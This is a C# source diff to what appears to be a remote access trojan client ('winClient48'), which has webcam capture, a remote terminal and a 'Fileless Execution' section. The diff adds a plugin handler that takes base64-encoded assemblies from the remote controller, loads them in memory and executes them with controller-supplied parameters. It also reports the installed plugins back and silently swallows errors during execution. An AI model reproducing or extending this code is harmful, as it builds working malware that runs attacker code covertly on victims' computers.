@@ -28,6 +28,7 @@ using AForge.Video;
 using AForge.Video.DirectShow;
 
 using Microsoft.Win32;
+using Plugin.Abstractions48;
 using System;
 using System.Collections.Concurrent;
 using System.Collections.Generic;
@@ -54,6 +55,7 @@ namespace winClient48
     {
         private string[] m_args;
         clsfnXterm m_fnXterm;
+        clsPluginMgr m_pluginMgr;
 
         public Form1(string[] args)
         {
@@ -2195,7 +2197,73 @@ namespace winClient48
 
                 else if (cmd[0] == "plugin")
                 {
+                    if (m_pluginMgr == null)
+                    {
+                        var context = new clsPluginContext();
+                        m_pluginMgr = new clsPluginMgr(context);
+                    }
 
+                    if (cmd[1] == "ls")
+                    {
+                        var plugins = m_pluginMgr.Plugins;
+                        List<string> ls = new List<string>();
+                        foreach (string szName in plugins.Keys)
+                        {
+                            var plugin = plugins[szName];
+                            ls.Add($"{plugin.Name},{plugin.Version}");
+                        }
+
+                        v.fnSendCommand(new string[]
+                        {
+                            "plugin",
+                            "ls",
+                            string.Join(",", ls.Select(x => Crypto.b64E2Str(x))),
+                        });
+                    }
+                    else if (cmd[1] == "load")
+                    {
+                        try
+                        {
+                            string szName = cmd[2];
+                            byte[] abPluginBuffer = Convert.FromBase64String(cmd[3]);
+
+                            m_pluginMgr.Load(abPluginBuffer);
+
+                            v.fnSendCommand(new string[]
+                            {
+                                "plugin",
+                                "load",
+                                szName,
+                            });
+                        }
+                        catch (ReflectionTypeLoadException ex)
+                        {
+                            MessageBox.Show(ex.Message);
+                        }
+                    }
+                    else if (cmd[1] == "run")
+                    {
+                        try
+                        {
+                            string szName = cmd[2];
+                            var dic = new Dictionary<string, object>();
+
+                            for (int i = 3; i < cmd.Length; i++)
+                            {
+                                string szItem = Crypto.b64D2Str(cmd[i]);
+                                string[] s = szItem.Split('=');
+
+                                dic.Add(s[0], s[1]);
+                            }
+
+                            var ret = m_pluginMgr.Execute(szName, dic);
+
+                        }
+                        catch (Exception ex)
+                        {
+
+                        }
+                    }
                 }
 
                 #region Fileless Execution
